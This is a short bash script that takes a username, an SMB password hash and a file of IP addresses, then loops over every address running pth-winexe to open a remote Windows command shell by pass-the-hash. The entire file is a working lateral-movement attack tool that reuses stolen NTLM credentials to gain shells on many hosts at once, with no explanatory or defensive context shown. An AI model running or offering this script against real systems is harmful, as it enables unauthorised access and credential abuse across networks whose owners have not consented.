#! /bin/bash

user=$1
smbhash=$2
file=$3

echo $user $smbhash $file
export SMBHASH=$smbhash
echo $SMBHASH

for ip in `cat ./$file`
do
	echo "pth to: $ip"
	pth-winexe -U $user% //$ip cmd
done
